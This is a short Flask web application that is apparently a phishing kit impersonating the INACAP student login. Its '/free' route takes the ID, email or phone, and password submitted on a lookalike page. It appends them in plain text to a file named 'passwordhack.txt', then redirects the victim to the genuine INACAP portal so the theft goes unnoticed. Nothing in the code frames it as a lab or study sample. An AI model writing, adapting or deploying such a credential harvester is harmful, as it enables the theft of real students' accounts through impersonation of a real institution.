from flask import Flask, request, render_template, redirect

app = Flask(__name__)

@app.route("/")
def main():
    return render_template("inacap.html")

@app.route("/free", methods=['GET', 'POST'])
def final1():
    if request.method == 'POST':
        name = request.form.get('bid')
        emailphone = request.form.get('EPN')
        passw1 = request.form.get('pass1')
        with open("passwordhack.txt", "a") as file:
            file.writelines(f"\nid: {name}\nemail phone: {emailphone}\npassword: {passw1}\n###############")
        return redirect("https://digital.inacap.cl/tipo-de-usuario/index.html")
    else:
        return render_template('post.html')

if __name__ == "__main__":
    # Habilita debug=True para el modo de depuración y host='0.0.0.0' para acceso en todas las IPs
    app.run(host='0.0.0.0', port=5000, debug=True)
